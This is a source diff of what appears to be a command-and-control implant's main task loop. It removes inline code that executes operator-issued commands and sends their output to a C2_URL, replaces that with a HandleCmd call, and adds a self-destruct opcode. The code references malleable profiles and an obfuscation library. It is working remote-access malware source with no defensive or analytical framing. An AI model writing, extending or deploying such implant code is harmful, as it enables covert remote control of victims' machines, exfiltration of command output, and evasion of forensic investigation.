@@ -19,12 +19,12 @@
 #include "opcode.h"
 #include "command.h"
 #include "utils.h"
+#include "handlers.h"
 
 using namespace std;
 // using namespace andrivet::ADVobfuscator;
 
 MalleableProfile *currentProfile;
-
 
 int main()
 {
@@ -79,48 +79,11 @@ int main()
 		DEBUG_PRINTF("Opcode: %d\n", opcode);
 		if (opcode == OPCODE_CMD)
 		{
-			DEBUG_PRINTF("Executing command\n");
-			// Execute command
-			SIZE_T cmdOutSize = 0;
-			LPBYTE output;
-			if (newTask->args->IsString()) {
-				output = ExecuteCmd(newTask->args->GetString(), &cmdOutSize);
-			} else if (newTask->args->IsArray()) {
-				vector<string> args;
-				for (auto& arg : newTask->args->GetArray()) {
-					args.push_back(arg.GetString());
-				}
-				output = ExecuteCmdArgVector(args, &cmdOutSize);
-				DEBUG_PRINTF("Command output: %s\n", LPBYTEToString(output, cmdOutSize).c_str());
-			} else {
-				DEBUG_PRINTF("Invalid command arguments\n");
-				continue;
-			}
-			
-			if (output == NULL)
-			{
-				DEBUG_PRINTF("Error executing command\n");
-				continue;
-			}
-
-			if (cmdOutSize == 0)
-			{
-				DEBUG_PRINTF("Command output is empty\n");
-				continue;
-			}
-
-			// Send output
-			DEBUG_PRINTF("Sending output\n");
-			success = true;
-			if (!SendTaskResult(newTask->taskId.c_str(), C2_URL, LPBYTEToString(output, cmdOutSize).c_str(), success, currentProfile))
-			{
-				DEBUG_PRINTF("Error sending output\n");
-				continue;
-			}
-			
-
-			DEBUG_PRINTF("Command output: %s\n", LPBYTEToString(output, cmdOutSize).c_str());
+			HandleCmd(newTask, currentProfile);
 		}
-
+		else if (opcode == OPCODE_SELFDESTRUCT)
+		{
+			SelfDestruct();
+		}
 	}
 }
